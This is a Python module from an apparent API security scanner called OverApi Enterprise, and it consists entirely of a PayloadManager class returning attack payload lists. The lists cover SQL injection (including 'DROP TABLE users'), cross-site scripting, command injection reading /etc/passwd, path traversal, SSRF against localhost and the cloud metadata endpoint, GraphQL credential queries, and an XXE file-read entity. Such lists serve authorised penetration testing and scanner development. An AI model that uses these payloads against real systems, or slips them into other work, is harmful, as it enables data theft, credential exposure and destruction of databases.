"""
Advanced Payloads for OverApi Enterprise
"""

class PayloadManager:
    """Manages attack payloads for various vulnerability types."""

    @staticmethod
    def get_sqli_payloads():
        return [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin' --",
            "1' UNION SELECT null, null --",
            "1; DROP TABLE users",
            "' OR '1'='1' --",
            "') OR ('1'='1",
            "1 AND 1=1",
            "1 AND 1=2",
            "ORDER BY 100 --"
        ]

    @staticmethod
    def get_xss_payloads():
        return [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "{{7*7}}", # Angular/Vue
            "${7*7}"   # Template injection
        ]

    @staticmethod
    def get_cmd_injection_payloads():
        return [
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "$(ls -la)",
            "`ls -la`",
            "|| ls -la",
            "; cat /etc/passwd",
            "| cat /etc/passwd"
        ]

    @staticmethod
    def get_lfi_payloads():
        return [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "file:///etc/passwd",
            "C:\\Windows\\win.ini"
        ]

    @staticmethod
    def get_ssrf_payloads():
        return [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:25"
        ]

    @staticmethod
    def get_graphql_payloads():
        return [
            "{__schema{types{name,fields{name}}}}",
            "{__typename}",
            "query { users { id, password } }", # Generic guess
            "query { me { id, token } }"
        ]

    @staticmethod
    def get_xxe_payloads():
        return [
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>"""
        ]
